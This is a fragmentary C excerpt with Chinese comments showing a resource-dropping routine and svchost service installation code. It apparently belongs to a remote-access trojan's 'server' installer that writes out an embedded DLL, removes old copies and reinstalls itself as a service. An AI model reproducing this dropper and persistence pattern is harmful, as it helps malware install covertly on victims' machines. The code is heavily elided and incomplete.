...
/*
BOOL ReleaseResource(HMODULE hModule, LPCTSTR wResourceID, LPCTSTR lpType, LPCTSTR lpFileName, LPCTSTR lpConfigString,LPCTSTR lpVersion)
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	...
	if (lpVersion != NULL)
	{
		WriteFile(hFile,lpVersion,lstrlen(lpVersion)+1,&dwBytes,NULL);		
	}
	CloseHandle(hFile);
	FreeResource(hRes);
...
char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription)
{
    ...
    for(ptr = strSubKey; *ptr; ptr = strchr(ptr, 0)+1)
    {
		...
		// 删除试试
		DeleteFile(MyDllPath);
		// 以前的服务文件没有删除之前，服务的DLL还在svchost中，所以不用这个服务
		if (GetFileAttributes(MyDllPath) != INVALID_FILE_ATTRIBUTES)
			continue;
...
//这个方法可以重复装服务端，即使之前的还没卸载，前面那个安装方法只适用于没安装过的，因为DLL路径我们已经改了
char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription)
{
    	// Open a handle to the SC Manager database.
	char MyDllPath[MAX_PATH];

   //扩展环境变量%systemroot%\\之类的为实际路径
	ExpandEnvironmentStrings(server_data.ReleasePath, MyDllPath, MAX_PATH); 
